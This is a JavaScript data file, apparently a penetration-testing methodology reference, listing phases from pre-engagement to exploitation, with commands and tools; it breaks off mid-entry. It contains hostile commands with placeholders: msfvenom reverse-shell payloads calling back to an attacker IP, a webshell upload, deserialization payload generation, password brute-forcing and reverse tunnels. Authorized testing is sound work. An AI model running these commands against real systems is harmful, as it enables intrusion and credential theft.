"use strict";

// =============================================================================
// Penetration Testing Methodology Reference
// =============================================================================
// Comprehensive methodology database for penetration testing engagements.
// Covers general pentest, web app, Active Directory, API, mobile, and cloud.
// All commands and tools reference real-world utilities.
// =============================================================================

// -----------------------------------------------------------------------------
// 1. PENTEST_METHODOLOGY -- General Penetration Testing (7 phases)
// -----------------------------------------------------------------------------

const PENTEST_METHODOLOGY = [
  // -------------------------------------------------------------------------
  // Phase 1: Pre-engagement
  // -------------------------------------------------------------------------
  {
    phase: "Pre-engagement",
    steps: [
      {
        name: "Define Scope",
        description: "Establish the boundaries of the engagement including IP ranges, domains, and out-of-scope assets. Document all constraints and limitations.",
        commands: ["whois <target-domain>", "dig <target-domain> ANY"],
        tools: ["whois", "dig", "nslookup"],
        expectedOutput: "Documented scope definition with IP ranges, domains, and exclusions"
      },
      {
        name: "Obtain Authorization",
        description: "Secure written authorization (Rules of Engagement) from the client. Ensure legal protections and define acceptable testing windows.",
        commands: [],
        tools: ["Document templates", "Legal review"],
        expectedOutput: "Signed Rules of Engagement document with emergency contacts"
      },
      {
        name: "Identify Emergency Contacts",
        description: "Establish communication channels and emergency contacts in case testing causes service disruption or triggers incident response.",
        commands: [],
        tools: ["Communication plan template"],
        expectedOutput: "Emergency contact list with escalation procedures"
      },
      {
        name: "Set Up Testing Environment",
        description: "Prepare the testing infrastructure including VPN connections, attack machines, and logging systems.",
        commands: [
          "openvpn --config client.ovpn",
          "systemctl start postgresql",
          "msfdb init",
          "mkdir -p /root/engagements/<client>/evidence"
        ],
        tools: ["OpenVPN", "Kali Linux", "Metasploit", "tmux"],
        expectedOutput: "Functional testing environment with connectivity to target network"
      },
      {
        name: "Configure Logging",
        description: "Enable comprehensive logging of all testing activities for evidence preservation and reporting purposes.",
        commands: [
          "script -a /root/engagements/<client>/terminal.log",
          "export HISTTIMEFORMAT='%F %T '",
          "tcpdump -i eth0 -w /root/engagements/<client>/capture.pcap &"
        ],
        tools: ["script", "tcpdump", "Burp Suite Logger"],
        expectedOutput: "Active logging capturing all terminal sessions and network traffic"
      },
      {
        name: "Review Previous Reports",
        description: "Analyze any previous penetration test reports or vulnerability assessments to understand known issues and prior remediation efforts.",
        commands: [],
        tools: ["PDF reader", "Note-taking application"],
        expectedOutput: "Summary of previously identified vulnerabilities and their remediation status"
      },
      {
        name: "Define Success Criteria",
        description: "Establish measurable objectives for the engagement such as obtaining domain admin, accessing sensitive data, or bypassing specific controls.",
        commands: [],
        tools: ["Project management tools"],
        expectedOutput: "Documented success criteria aligned with client objectives"
      },
      {
        name: "Network Connectivity Verification",
        description: "Verify that the testing machine can reach all in-scope targets and that VPN or other access mechanisms are functioning correctly.",
        commands: [
          "ping -c 3 <target-ip>",
          "traceroute <target-ip>",
          "nmap -sn <target-range>/24",
          "curl -I https://<target-domain>"
        ],
        tools: ["ping", "traceroute", "nmap", "curl"],
        expectedOutput: "Confirmed connectivity to all in-scope targets"
      },
      {
        name: "Tool Validation",
        description: "Verify that all required tools are installed, updated, and functioning correctly before beginning the engagement.",
        commands: [
          "nmap --version",
          "msfconsole -v",
          "burpsuite --version 2>/dev/null || echo 'Launch Burp Suite GUI'",
          "nuclei -version",
          "sqlmap --version",
          "hashcat --version",
          "john --version",
          "gobuster version"
        ],
        tools: ["nmap", "Metasploit", "Burp Suite", "Nuclei", "SQLMap", "Hashcat", "John the Ripper", "Gobuster"],
        expectedOutput: "All tools validated and ready for use"
      },
      {
        name: "Threat Model Review",
        description: "Review the client threat model to understand likely attack vectors, adversary capabilities, and high-value targets.",
        commands: [],
        tools: ["STRIDE", "PASTA", "Attack Tree modeling"],
        expectedOutput: "Threat model summary identifying primary attack vectors and threat actors"
      },
      {
        name: "Compliance Requirements",
        description: "Identify any compliance frameworks (PCI DSS, HIPAA, SOC2) that influence testing methodology and reporting requirements.",
        commands: [],
        tools: ["Compliance checklists"],
        expectedOutput: "Documented compliance requirements affecting the engagement"
      },
      {
        name: "Communication Plan",
        description: "Establish regular status update schedule, reporting format, and escalation procedures for critical findings.",
        commands: [],
        tools: ["Email", "Secure messaging"],
        expectedOutput: "Agreed communication plan with update frequency and escalation matrix"
      },
      {
        name: "Data Handling Procedures",
        description: "Define how sensitive data encountered during testing will be handled, stored, and eventually destroyed.",
        commands: [
          "gpg --gen-key",
          "veracrypt --create /root/engagements/<client>/sensitive.hc"
        ],
        tools: ["GPG", "VeraCrypt", "Secure deletion tools"],
        expectedOutput: "Documented data handling procedures with encryption requirements"
      },
      {
        name: "Backup Verification",
        description: "Confirm that the client has current backups of systems in scope in case testing causes data corruption or service disruption.",
        commands: [],
        tools: ["Client backup verification"],
        expectedOutput: "Client confirmation of current, tested backups for all in-scope systems"
      },
      {
        name: "Timeline and Milestones",
        description: "Define the testing timeline with specific milestones for each phase of the engagement.",
        commands: [],
        tools: ["Project planning tools"],
        expectedOutput: "Detailed project timeline with phase milestones and deliverable dates"
      }
    ]
  },

  // -------------------------------------------------------------------------
  // Phase 2: Reconnaissance
  // -------------------------------------------------------------------------
  {
    phase: "Reconnaissance",
    steps: [
      {
        name: "OSINT Domain Enumeration",
        description: "Discover subdomains, related domains, and DNS records using passive reconnaissance techniques.",
        commands: [
          "amass enum -passive -d <domain> -o amass-passive.txt",
          "subfinder -d <domain> -o subfinder.txt",
          "assetfinder --subs-only <domain> | tee assetfinder.txt",
          "cat amass-passive.txt subfinder.txt assetfinder.txt | sort -u > all-subdomains.txt"
        ],
        tools: ["Amass", "Subfinder", "Assetfinder"],
        expectedOutput: "Consolidated list of discovered subdomains"
      },
      {
        name: "DNS Record Analysis",
        description: "Query DNS records to identify mail servers, name servers, SPF/DKIM/DMARC configurations, and other infrastructure details.",
        commands: [
          "dig <domain> ANY +noall +answer",
          "dig <domain> MX +short",
          "dig <domain> NS +short",
          "dig <domain> TXT +short",
          "dig _dmarc.<domain> TXT +short",
          "dnsrecon -d <domain> -t std",
          "dnsenum <domain>"
        ],
        tools: ["dig", "dnsrecon", "dnsenum", "host"],
        expectedOutput: "Complete DNS record inventory including MX, NS, TXT, SOA records"
      },
      {
        name: "WHOIS Intelligence",
        description: "Gather registration information for domains and IP addresses to identify ownership, registrars, and related infrastructure.",
        commands: [
          "whois <domain>",
          "whois <ip-address>",
          "amass intel -whois -d <domain>"
        ],
        tools: ["whois", "Amass"],
        expectedOutput: "Domain registration details including registrant, name servers, and creation dates"
      },
      {
        name: "Certificate Transparency Logs",
        description: "Search certificate transparency logs to discover additional subdomains and related infrastructure.",
        commands: [
          "curl -s 'https://crt.sh/?q=%25.<domain>&output=json' | jq -r '.[].name_value' | sort -u",
          "certspotter <domain>"
        ],
        tools: ["crt.sh", "Certspotter", "curl", "jq"],
        expectedOutput: "List of domains from CT logs including wildcard and expired certificates"
      },
      {
        name: "Search Engine Dorking",
        description: "Use search engine operators to discover exposed files, login pages, error messages, and other sensitive information.",
        commands: [
          "googler -n 50 'site:<domain> filetype:pdf'",
          "googler -n 50 'site:<domain> inurl:admin'",
          "googler -n 50 'site:<domain> intitle:\"index of\"'",
          "googler -n 50 'site:<domain> ext:sql | ext:db | ext:log | ext:cfg | ext:bak'"
        ],
        tools: ["googler", "Google", "Bing", "DuckDuckGo"],
        expectedOutput: "List of exposed files, admin panels, and sensitive information indexed by search engines"
      },
      {
        name: "Web Archive Analysis",
        description: "Search web archives for historical versions of websites to discover old endpoints, removed content, and configuration files.",
        commands: [
          "waybackurls <domain> | tee wayback-urls.txt",
          "gau <domain> | tee gau-urls.txt",
          "cat wayback-urls.txt gau-urls.txt | sort -u | grep -E '\\.(js|json|xml|conf|cfg|bak|sql|env)$' > interesting-files.txt"
        ],
        tools: ["waybackurls", "gau", "Wayback Machine"],
        expectedOutput: "Historical URLs with potentially interesting endpoints and files"
      },
      {
        name: "Social Media Intelligence",
        description: "Gather information from social media platforms about employees, technologies used, and organizational structure.",
        commands: [
          "theHarvester -d <domain> -b all -f harvest-results",
          "sherlock <username>",
          "linkedin2username -c <company-name>"
        ],
        tools: ["theHarvester", "Sherlock", "linkedin2username"],
        expectedOutput: "Employee names, email addresses, and social media profiles"
      },
      {
        name: "Email Harvesting",
        description: "Collect email addresses associated with the target organization from various public sources.",
        commands: [
          "theHarvester -d <domain> -b google,bing,linkedin -l 500 -f emails",
          "hunter.io API query for <domain>",
          "h8mail -t <domain> -c h8mail_config.ini"
        ],
        tools: ["theHarvester", "Hunter.io", "h8mail"],
        expectedOutput: "List of valid email addresses with sources"
      },
      {
        name: "Technology Stack Identification",
        description: "Identify the web technologies, frameworks, CMS platforms, and server software in use by the target.",
        commands: [
          "whatweb -a 3 <url>",
          "wappalyzer-cli <url>",
          "curl -sI <url> | grep -iE '^(Server|X-Powered-By|X-AspNet|X-Generator):'",
          "nuclei -u <url> -t technologies/"
        ],
        tools: ["WhatWeb", "Wappalyzer", "curl", "Nuclei"],
        expectedOutput: "Technology stack inventory including web server, framework, CMS, and programming language"
      },
      {
        name: "ASN and IP Range Discovery",
        description: "Identify the Autonomous System Numbers and IP address ranges associated with the target organization.",
        commands: [
          "amass intel -org '<organization-name>'",
          "whois -h whois.radb.net -- '-i origin AS<number>'",
          "bgpview API query for organization",
          "nmap --script targets-asn --script-args targets-asn.asn=<ASN>"
        ],
        tools: ["Amass", "whois", "BGPView", "nmap"],
        expectedOutput: "List of ASNs and associated IP ranges owned by the organization"
      },
      {
        name: "Leaked Credentials Search",
        description: "Search for credentials associated with the target domain in known data breaches and paste sites.",
        commands: [
          "h8mail -t <domain> -c h8mail_config.ini",
          "pwndb query for <domain>"
        ],
        tools: ["h8mail", "PwnDB", "DeHashed", "Have I Been Pwned API"],
        expectedOutput: "List of potentially compromised credentials associated with target email addresses"
      },
      {
        name: "Cloud Infrastructure Discovery",
        description: "Identify cloud-hosted resources including S3 buckets, Azure blobs, and GCP storage associated with the target.",
        commands: [
          "cloud_enum -k <keyword> -l cloud_enum.log",
          "s3scanner scan --bucket-file buckets.txt",
          "grayhatwarfare API search for <keyword>"
        ],
        tools: ["cloud_enum", "S3Scanner", "GrayhatWarfare"],
        expectedOutput: "List of discovered cloud storage resources and their accessibility status"
      },
      {
        name: "GitHub and Code Repository Recon",
        description: "Search public code repositories for exposed secrets, API keys, configuration files, and internal documentation.",
        commands: [
          "trufflehog github --org=<org-name>",
          "gitrob analyze <org-name>",
          "gitleaks detect --source=https://github.com/<org>/<repo>",
          "gh search code '<domain> password OR secret OR api_key' --limit 50"
        ],
        tools: ["TruffleHog", "Gitrob", "Gitleaks", "GitHub CLI"],
        expectedOutput: "List of exposed secrets and sensitive files in public repositories"
      },
      {
        name: "Network Range Mapping",
        description: "Map the complete network range of the target including all externally-facing hosts and services.",
        commands: [
          "masscan <target-range>/16 -p0-65535 --rate 10000 -oG masscan-results.gnmap",
          "nmap -sn <target-range>/24 -oA ping-sweep",
          "fping -a -g <target-range>/24 2>/dev/null | tee live-hosts.txt"
        ],
        tools: ["Masscan", "nmap", "fping"],
        expectedOutput: "Complete map of live hosts and open ports across the target network range"
      },
      {
        name: "Metadata Analysis",
        description: "Extract metadata from publicly available documents to discover usernames, software versions, and internal paths.",
        commands: [
          "metagoofil -d <domain> -t pdf,doc,xls,ppt -l 100 -o metagoofil-output/",
          "exiftool metagoofil-output/*.pdf",
          "foca <domain>"
        ],
        tools: ["Metagoofil", "ExifTool", "FOCA"],
        expectedOutput: "Extracted metadata including usernames, internal paths, software versions, and printer names"
      },
      {
        name: "Wireless Network Discovery",
        description: "Identify wireless networks associated with the target including SSIDs, encryption types, and access points.",
        commands: [
          "airmon-ng start wlan0",
          "airodump-ng wlan0mon -w wireless-scan --output-format csv",
          "wash -i wlan0mon"
        ],
        tools: ["airmon-ng", "airodump-ng", "wash", "Kismet"],
        expectedOutput: "List of wireless networks with SSIDs, BSSIDs, encryption types, and signal strength"
      }
    ]
  },

  // -------------------------------------------------------------------------
  // Phase 3: Scanning
  // -------------------------------------------------------------------------
  {
    phase: "Scanning",
    steps: [
      {
        name: "TCP Port Scan",
        description: "Perform a comprehensive TCP port scan against all in-scope hosts to identify open ports and running services.",
        commands: [
          "nmap -sS -p- -T4 --min-rate 1000 -oA tcp-full <target>",
          "nmap -sS -sV -sC -p <open-ports> -oA tcp-detailed <target>",
          "masscan <target> -p0-65535 --rate 10000 -oG masscan-tcp.gnmap"
        ],
        tools: ["nmap", "Masscan"],
        expectedOutput: "Complete list of open TCP ports with service versions and script output"
      },
      {
        name: "UDP Port Scan",
        description: "Scan for open UDP ports to discover services like DNS, SNMP, TFTP, NTP, and other UDP-based protocols.",
        commands: [
          "nmap -sU --top-ports 1000 -T4 -oA udp-scan <target>",
          "nmap -sU -p 53,67,68,69,123,135,137,138,161,162,445,500,514,520,631,1434,1900,4500,5353,49152 -oA udp-common <target>",
          "unicornscan -mU -p 1-65535 <target>"
        ],
        tools: ["nmap", "unicornscan"],
        expectedOutput: "List of open UDP ports with identified services"
      },
      {
        name: "Service Version Detection",
        description: "Fingerprint running services to determine exact software versions, enabling targeted vulnerability research.",
        commands: [
          "nmap -sV --version-intensity 5 -p <ports> <target> -oA service-versions",
          "amap -bqv <target> <port>",
          "netcat -nv <target> <port>"
        ],
        tools: ["nmap", "amap", "netcat"],
        expectedOutput: "Detailed service version information for all open ports"
      },
      {
        name: "OS Detection",
        description: "Determine the operating system of target hosts through TCP/IP stack fingerprinting and other techniques.",
        commands: [
          "nmap -O --osscan-guess <target> -oA os-detection",
          "xprobe2 <target>",
          "p0f -i eth0 -o p0f-results.log"
        ],
        tools: ["nmap", "xprobe2", "p0f"],
        expectedOutput: "Operating system identification with confidence levels"
      },
      {
        name: "Web Application Discovery",
        description: "Identify web applications running on discovered HTTP/HTTPS ports including virtual hosts and hidden applications.",
        commands: [
          "httpx -l live-hosts.txt -p 80,443,8080,8443,8000,8888 -title -tech-detect -status-code -o httpx-results.txt",
          "aquatone -ports xlarge -out aquatone-results/ < live-hosts.txt",
          "eyewitness --web -f urls.txt --no-prompt -d eyewitness-output/"
        ],
        tools: ["httpx", "Aquatone", "EyeWitness"],
        expectedOutput: "Inventory of web applications with titles, technologies, and screenshots"
      },
      {
        name: "Directory and File Bruteforcing",
        description: "Discover hidden directories, files, and endpoints on web servers using wordlist-based bruteforcing.",
        commands: [
          "gobuster dir -u <url> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,asp,aspx,jsp,html,js,txt -o gobuster.txt -t 50",
          "feroxbuster -u <url> -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,asp,html -o feroxbuster.txt",
          "ffuf -u <url>/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -mc 200,301,302,403 -o ffuf-results.json"
        ],
        tools: ["Gobuster", "Feroxbuster", "ffuf"],
        expectedOutput: "List of discovered directories and files with response codes"
      },
      {
        name: "Virtual Host Enumeration",
        description: "Discover virtual hosts on web servers by bruteforcing Host headers to find additional web applications.",
        commands: [
          "ffuf -u http://<target-ip> -H 'Host: FUZZ.<domain>' -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -mc 200 -fs <default-size>",
          "gobuster vhost -u http://<target-ip> -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt"
        ],
        tools: ["ffuf", "Gobuster"],
        expectedOutput: "List of discovered virtual hosts with response sizes"
      },
      {
        name: "SSL/TLS Analysis",
        description: "Analyze SSL/TLS configurations to identify weak ciphers, expired certificates, and protocol vulnerabilities.",
        commands: [
          "sslscan <target>:443",
          "testssl.sh <target>:443",
          "nmap --script ssl-enum-ciphers -p 443 <target>",
          "sslyze <target>:443 --regular"
        ],
        tools: ["sslscan", "testssl.sh", "nmap", "sslyze"],
        expectedOutput: "SSL/TLS configuration details including supported protocols, ciphers, and certificate information"
      },
      {
        name: "SNMP Enumeration",
        description: "Enumerate SNMP services to discover system information, network configurations, and potential credentials.",
        commands: [
          "snmpwalk -v2c -c public <target> 1.3.6.1.2.1 | tee snmpwalk.txt",
          "snmp-check <target> -c public",
          "onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt <target>",
          "nmap -sU -p 161 --script snmp-brute,snmp-info,snmp-interfaces,snmp-processes <target>"
        ],
        tools: ["snmpwalk", "snmp-check", "onesixtyone", "nmap"],
        expectedOutput: "SNMP enumeration results including system info, interfaces, and running processes"
      },
      {
        name: "SMB Enumeration",
        description: "Enumerate SMB shares, users, and security configurations on Windows systems.",
        commands: [
          "enum4linux -a <target> | tee enum4linux.txt",
          "smbclient -L //<target> -N",
          "smbmap -H <target>",
          "crackmapexec smb <target> --shares",
          "nmap -p 445 --script smb-enum-shares,smb-enum-users,smb-os-discovery <target>"
        ],
        tools: ["enum4linux", "smbclient", "smbmap", "CrackMapExec", "nmap"],
        expectedOutput: "List of SMB shares, users, groups, and OS information"
      },
      {
        name: "LDAP Enumeration",
        description: "Query LDAP services to enumerate users, groups, organizational units, and domain information.",
        commands: [
          "ldapsearch -x -H ldap://<target> -b 'dc=<domain>,dc=<tld>' -s sub '(objectClass=*)' | tee ldap-enum.txt",
          "ldapsearch -x -H ldap://<target> -b 'dc=<domain>,dc=<tld>' '(objectClass=user)' sAMAccountName",
          "nmap -p 389,636 --script ldap-rootdse,ldap-search <target>"
        ],
        tools: ["ldapsearch", "nmap", "ldapdomaindump"],
        expectedOutput: "LDAP directory structure with users, groups, and organizational information"
      },
      {
        name: "SMTP Enumeration",
        description: "Enumerate SMTP services to discover valid usernames through VRFY, EXPN, and RCPT TO commands.",
        commands: [
          "smtp-user-enum -M VRFY -U /usr/share/seclists/Usernames/Names/names.txt -t <target>",
          "smtp-user-enum -M RCPT -U users.txt -D <domain> -t <target>",
          "nmap -p 25 --script smtp-enum-users,smtp-commands,smtp-open-relay <target>"
        ],
        tools: ["smtp-user-enum", "nmap"],
        expectedOutput: "List of valid email addresses and SMTP server capabilities"
      },
      {
        name: "DNS Zone Transfer",
        description: "Attempt DNS zone transfers to obtain complete DNS records for the target domain.",
        commands: [
          "dig axfr <domain> @<ns-server>",
          "dnsrecon -d <domain> -t axfr",
          "fierce --domain <domain> --dns-servers <ns-server>"
        ],
        tools: ["dig", "dnsrecon", "fierce"],
        expectedOutput: "Complete DNS zone data if transfer is permitted"
      },
      {
        name: "Network Sniffing",
        description: "Capture and analyze network traffic to discover cleartext credentials, protocols, and communication patterns.",
        commands: [
          "tcpdump -i eth0 -w capture.pcap -c 10000",
          "tshark -i eth0 -f 'port 80 or port 21 or port 23 or port 110' -w cleartext.pcap",
          "net-creds -i eth0"
        ],
        tools: ["tcpdump", "Wireshark", "tshark", "net-creds"],
        expectedOutput: "Captured network traffic with identified protocols and potential credentials"
      },
      {
        name: "Nmap Script Scanning",
        description: "Run targeted NSE scripts against identified services to discover additional information and vulnerabilities.",
        commands: [
          "nmap -sV --script=default,vuln -p <ports> <target> -oA nse-scan",
          "nmap --script=http-enum,http-headers,http-methods,http-title -p 80,443 <target>",
          "nmap --script=ftp-anon,ftp-bounce,ftp-syst -p 21 <target>"
        ],
        tools: ["nmap"],
        expectedOutput: "NSE script results revealing additional service details and potential vulnerabilities"
      },
      {
        name: "Web Crawler and Spider",
        description: "Crawl web applications to discover all accessible pages, forms, parameters, and API endpoints.",
        commands: [
          "gospider -s <url> -d 3 -c 10 -o spider-output/",
          "hakrawler -url <url> -depth 3 -plain | tee crawl-results.txt",
          "katana -u <url> -d 5 -jc -o katana-output.txt"
        ],
        tools: ["Gospider", "Hakrawler", "Katana", "Burp Suite Spider"],
        expectedOutput: "Complete sitemap with all discovered URLs, parameters, and forms"
      }
    ]
  },

  // -------------------------------------------------------------------------
  // Phase 4: Vulnerability Analysis
  // -------------------------------------------------------------------------
  {
    phase: "Vulnerability Analysis",
    steps: [
      {
        name: "Automated Vulnerability Scanning",
        description: "Run automated vulnerability scanners against discovered services to identify known vulnerabilities.",
        commands: [
          "nmap -sV --script vuln -p <ports> <target> -oA vuln-scan",
          "nuclei -u <url> -t cves/ -severity critical,high -o nuclei-results.txt",
          "nikto -h <url> -output nikto-results.txt",
          "openvas-cli --target <target> --scan-start"
        ],
        tools: ["nmap", "Nuclei", "Nikto", "OpenVAS"],
        expectedOutput: "List of identified vulnerabilities with severity ratings and CVE references"
      },
      {
        name: "CVE Research",
        description: "Research identified CVEs to determine exploitability, available exploits, and potential impact.",
        commands: [
          "searchsploit <service> <version>",
          "searchsploit -m <exploit-id>",
          "msfconsole -q -x 'search cve:<CVE-ID>'",
          "curl -s 'https://services.nvd.nist.gov/rest/json/cves/2.0?cveId=<CVE-ID>' | jq '.vulnerabilities[0].cve.descriptions'"
        ],
        tools: ["SearchSploit", "Metasploit", "NVD API", "Exploit-DB"],
        expectedOutput: "Detailed vulnerability analysis with available exploits and impact assessment"
      },
      {
        name: "Web Application Vulnerability Scan",
        description: "Scan web applications for common vulnerabilities including injection flaws, XSS, CSRF, and misconfigurations.",
        commands: [
          "nikto -h <url> -C all -output nikto-full.txt",
          "wpscan --url <url> -e ap,at,u --api-token <token>",
          "nuclei -u <url> -t http/ -severity critical,high,medium -o web-vulns.txt",
          "arachni <url> --report-save-path=arachni-report.afr"
        ],
        tools: ["Nikto", "WPScan", "Nuclei", "Arachni"],
        expectedOutput: "Comprehensive web vulnerability report with findings categorized by severity"
      },
      {
        name: "SQL Injection Testing",
        description: "Test for SQL injection vulnerabilities in web application parameters, headers, and cookies.",
        commands: [
          "sqlmap -u '<url>?id=1' --batch --dbs --level 3 --risk 2",
          "sqlmap -r request.txt --batch --dbs --level 5 --risk 3",
          "sqlmap -u '<url>' --data='param=value' --method POST --batch --dbs",
          "ghauri -u '<url>?id=1' --dbs --batch"
        ],
        tools: ["SQLMap", "Ghauri", "Burp Suite"],
        expectedOutput: "SQL injection vulnerability confirmation with database enumeration results"
      },
      {
        name: "Cross-Site Scripting Testing",
        description: "Test for reflected, stored, and DOM-based XSS vulnerabilities across web application inputs.",
        commands: [
          "dalfox url '<url>?param=test' --blind <collaborator-url>",
          "xsstrike -u '<url>?param=test'",
          "kxss < urls-with-params.txt | tee kxss-results.txt",
          "nuclei -u <url> -t http/vulnerabilities/xss/ -o xss-results.txt"
        ],
        tools: ["Dalfox", "XSSStrike", "kxss", "Nuclei", "Burp Suite"],
        expectedOutput: "Confirmed XSS vulnerabilities with proof-of-concept payloads"
      },
      {
        name: "Server-Side Request Forgery Testing",
        description: "Test for SSRF vulnerabilities that could allow access to internal services or cloud metadata endpoints.",
        commands: [
          "ffuf -u '<url>?url=FUZZ' -w /usr/share/seclists/Fuzzing/ssrf-url-list.txt -mc 200",
          "nuclei -u <url> -t http/vulnerabilities/ssrf/ -o ssrf-results.txt"
        ],
        tools: ["ffuf", "Nuclei", "Burp Suite Collaborator"],
        expectedOutput: "Confirmed SSRF vulnerabilities with accessible internal endpoints"
      },
      {
        name: "Local File Inclusion Testing",
        description: "Test for LFI/RFI vulnerabilities that could allow reading local files or executing remote code.",
        commands: [
          "ffuf -u '<url>?page=FUZZ' -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -mc 200 -fs <default-size>",
          "dotdotpwn -m http -h <target> -x <port> -f /etc/passwd -k 'root:' -d 8",
          "nuclei -u <url> -t http/vulnerabilities/lfi/ -o lfi-results.txt"
        ],
        tools: ["ffuf", "dotdotpwn", "Nuclei", "Burp Suite"],
        expectedOutput: "Confirmed LFI/RFI vulnerabilities with accessible files"
      },
      {
        name: "Command Injection Testing",
        description: "Test for OS command injection vulnerabilities in web application parameters and inputs.",
        commands: [
          "commix --url='<url>?param=test' --batch",
          "nuclei -u <url> -t http/vulnerabilities/command-injection/ -o cmdi-results.txt"
        ],
        tools: ["Commix", "Nuclei", "Burp Suite"],
        expectedOutput: "Confirmed command injection vulnerabilities with proof of execution"
      },
      {
        name: "Authentication Bypass Testing",
        description: "Test for authentication bypass vulnerabilities including default credentials, weak passwords, and logic flaws.",
        commands: [
          "hydra -L users.txt -P /usr/share/wordlists/rockyou.txt <target> http-post-form '/login:user=^USER^&pass=^PASS^:F=incorrect'",
          "medusa -h <target> -U users.txt -P passwords.txt -M http -m DIR:/admin",
          "nuclei -u <url> -t http/default-logins/ -o default-creds.txt"
        ],
        tools: ["Hydra", "Medusa", "Nuclei", "Burp Suite Intruder"],
        expectedOutput: "Identified authentication bypass vectors or discovered credentials"
      },
      {
        name: "Deserialization Testing",
        description: "Test for insecure deserialization vulnerabilities in Java, PHP, .NET, and Python applications.",
        commands: [
          "ysoserial CommonsCollections1 '<command>' > payload.bin",
          "java -jar ysoserial-all.jar CommonsCollections6 'ping <collaborator>' | base64",
          "phpggc <chain> '<command>' -b"
        ],
        tools: ["ysoserial", "phpggc", "Burp Suite"],
        expectedOutput: "Confirmed deserialization vulnerability with proof of code execution"
      },
      {
        name: "XML External Entity Testing",
        description: "Test for XXE vulnerabilities in XML parsers that could allow file reading, SSRF, or denial of service.",
        commands: [
          "nuclei -u <url> -t http/vulnerabilities/xxe/ -o xxe-results.txt"
        ],
        tools: ["Nuclei", "Burp Suite", "XXEinjector"],
        expectedOutput: "Confirmed XXE vulnerability with proof of file read or SSRF"
      },
      {
        name: "Template Injection Testing",
        description: "Test for Server-Side Template Injection (SSTI) vulnerabilities in templating engines like Jinja2, Twig, and Freemarker.",
        commands: [
          "tplmap -u '<url>?param=test'",
          "nuclei -u <url> -t http/vulnerabilities/ssti/ -o ssti-results.txt"
        ],
        tools: ["tplmap", "Nuclei", "Burp Suite"],
        expectedOutput: "Confirmed SSTI vulnerability with identified template engine and proof of execution"
      },
      {
        name: "Password Policy Analysis",
        description: "Analyze the password policy of the target application to identify weaknesses in complexity and lockout requirements.",
        commands: [
          "nmap --script smb-enum-password-policy -p 445 <target>",
          "crackmapexec smb <target> --pass-pol"
        ],
        tools: ["nmap", "CrackMapExec"],
        expectedOutput: "Documented password policy including complexity requirements, lockout threshold, and history"
      },
      {
        name: "Network Service Vulnerability Analysis",
        description: "Analyze network services for known vulnerabilities including misconfigurations and outdated versions.",
        commands: [
          "nmap -sV --script vuln -p 21,22,23,25,53,80,110,111,135,139,143,443,445,993,995,1723,3306,3389,5900,8080 <target>",
          "searchsploit <service-name> <version>",
          "msfconsole -q -x 'search type:exploit <service>; exit'"
        ],
        tools: ["nmap", "SearchSploit", "Metasploit"],
        expectedOutput: "Service-specific vulnerability assessment with exploitability ratings"
      },
      {
        name: "Vulnerability Prioritization",
        description: "Prioritize discovered vulnerabilities based on exploitability, impact, and business context.",
        commands: [],
        tools: ["CVSS Calculator", "Vulnerability management tools"],
        expectedOutput: "Prioritized vulnerability list with CVSS scores and recommended remediation order"
      }
    ]
  },

  // -------------------------------------------------------------------------
  // Phase 5: Exploitation
  // -------------------------------------------------------------------------
  {
    phase: "Exploitation",
    steps: [
      {
        name: "Exploit Selection and Customization",
        description: "Select appropriate exploits based on vulnerability analysis and customize payloads for the target environment.",
        commands: [
          "searchsploit -m <exploit-id>",
          "msfconsole -q -x 'use <exploit-path>; show options; show targets'",
          "msfvenom -p <payload> LHOST=<attacker-ip> LPORT=<port> -f <format> -o payload.<ext>"
        ],
        tools: ["SearchSploit", "Metasploit", "msfvenom"],
        expectedOutput: "Customized exploit and payload ready for deployment"
      },
      {
        name: "Initial Access via Web Exploit",
        description: "Gain initial access through web application vulnerabilities such as file upload, command injection, or deserialization.",
        commands: [
          "msfconsole -q -x 'use exploit/multi/handler; set payload <payload>; set LHOST <ip>; set LPORT <port>; run'",
          "python3 exploit.py --target <url> --lhost <ip> --lport <port>",
          "curl -X POST '<url>/upload' -F 'file=@webshell.php'"
        ],
        tools: ["Metasploit", "Custom scripts", "curl"],
        expectedOutput: "Remote shell or code execution on target web server"
      },
      {
        name: "Password Attacks",
        description: "Perform online and offline password attacks against discovered services and captured hashes.",
        commands: [
          "hydra -l admin -P /usr/share/wordlists/rockyou.txt <target> ssh",
          "hydra -L users.txt -P passwords.txt <target> ftp",
          "crackmapexec smb <target> -u users.txt -p passwords.txt --no-bruteforce",
          "hashcat -m <mode> hashes.txt /usr/share/wordlists/rockyou.txt --rules-file /usr/share/hashcat/rules/best64.rule",
          "john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt"
        ],
        tools: ["Hydra", "CrackMapExec", "Hashcat", "John the Ripper"],
        expectedOutput: "Cracked credentials for target services"
      },
      {
        name: "Exploit Public-Facing Application",
        description: "Exploit vulnerabilities in externally-accessible applications to gain initial foothold.",
        commands: [
          "msfconsole -q -x 'use <exploit/path>; set RHOSTS <target>; set RPORT <port>; set LHOST <attacker>; exploit'",
          "python3 poc-exploit.py <target> <port>"
        ],
        tools: ["Metasploit", "Custom exploit scripts"],
        expectedOutput: "Successful exploitation with shell access to the target system"
      },
      {
        name: "Client-Side Exploitation",
        description: "Craft and deliver client-side payloads through phishing, malicious documents, or browser exploits.",
        commands: [
          "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -f exe -o payload.exe",
          "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -f vba-exe",
          "gophish --admin-listen 0.0.0.0:3333"
        ],
        tools: ["msfvenom", "GoPhish", "Evilginx2", "SET"],
        expectedOutput: "Delivered payload execution on target workstation"
      },
      {
        name: "Pivoting and Tunneling",
        description: "Establish tunnels through compromised hosts to access internal network segments not directly reachable.",
        commands: [
          "ssh -D 9050 user@<pivot-host>",
          "ssh -L <local-port>:<internal-target>:<remote-port> user@<pivot-host>",
          "chisel server -p 8080 --reverse",
          "chisel client <attacker-ip>:8080 R:socks",
          "ligolo-ng agent --connect <attacker-ip>:11601 --ignore-cert"
        ],
        tools: ["SSH", "Chisel", "Ligolo-ng", "Proxychains"],
        expectedOutput: "Functional tunnel providing access to internal network segments"
      },
      {
